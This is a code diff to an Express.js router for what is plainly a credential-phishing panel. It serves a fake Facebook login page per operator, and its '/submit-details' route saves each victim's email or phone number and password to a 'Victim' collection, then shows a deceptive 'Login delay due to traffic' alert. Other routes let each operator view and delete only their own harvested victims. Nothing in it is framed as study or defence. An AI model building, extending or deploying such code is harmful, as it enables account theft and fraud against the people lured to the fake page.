@@ -61,13 +61,28 @@ router.post('/login', async (req, res) => {
 
 
 // Render dashboard page if user is logged in
+// router.get('/dashboard', async (req, res) => {
+//     if (!req.session.userId) {
+//         return res.redirect('/login');
+//     }
+//     try {
+//         const user = await User.findById(req.session.userId);
+//         res.render('dashboard', { user });
+//     } catch (err) {
+//         console.error('Error loading dashboard:', err);
+//         res.status(500).send('Error loading dashboard');
+//     }
+// });
+// Render dashboard page if user is logged in
 router.get('/dashboard', async (req, res) => {
     if (!req.session.userId) {
         return res.redirect('/login');
     }
     try {
         const user = await User.findById(req.session.userId);
-        res.render('dashboard', { user });
+        
+        // Pass userId separately to the template
+        res.render('dashboard', { user, userId: req.session.userId });
     } catch (err) {
         console.error('Error loading dashboard:', err);
         res.status(500).send('Error loading dashboard');
@@ -78,45 +93,71 @@ router.get('/dashboard', async (req, res) => {
 
 
 
+
+
+
+
+
+
 // Facebook page route
+// Route to render the Facebook page
 router.get('/facebook', (req, res) => {
-    res.render('facebook');
+    const userId = req.query.userId;
+    
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+
+    res.render('facebook', { userId });
 });
-// Submit login form and save to database
-router.post('/submit-login', async (req, res) => {
-    const { email, password } = req.body;
+
+// Submit login form and save to database with userId
+// Handle form submission
+router.post('/submit-details', async (req, res) => {
+    const { userId, emailOrNumber, password } = req.body;
+
     try {
-        const victim = new Victim({ emailOrNumber: email, password });
+        // Save victim details to the database
+        const victim = new Victim({ userId, emailOrNumber, password });
         await victim.save();
-    } catch (error) {
-        console.error("Error saving victim details:", error);
-        res.status(500).send("Server Error");
+
+        // Show alert message (you could redirect to the dashboard with a flash message instead)
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving victim details:', err);
+        res.status(500).send('Error processing request');
     }
 });
 
 
 
-// View victims page with data from database
+// View victims page with data specific to logged-in user
+// Route to render View Victims page
 router.get('/view-victims', async (req, res) => {
     try {
-        const victims = await Victim.find(); // Fetch all victims from the database
+        const victims = await Victim.find({ userId: req.session.userId });
         res.render('view-victims', { victims });
-    } catch (error) {
-        console.error("Error fetching victims:", error);
-        res.status(500).send("Server Error");
+    } catch (err) {
+        console.error('Error loading victims:', err);
+        res.status(500).send('Error loading victims');
     }
 });
+
+
+
 // Delete victim entry by ID
-router.post('/delete-victim', async (req, res) => {
-    const { id } = req.body;
+router.post('/delete-victim/:id', async (req, res) => {
+    const victimId = req.params.id;
+    
     try {
-        await Victim.findByIdAndDelete(id);
+        await Victim.findByIdAndDelete(victimId);
         res.redirect('/view-victims');
     } catch (error) {
-        console.error("Error deleting victim:", error);
-        res.status(500).send("Server Error");
+        console.error(error);
+        res.status(500).send('Error deleting data');
     }
 });
+
 
 
 module.exports = router;
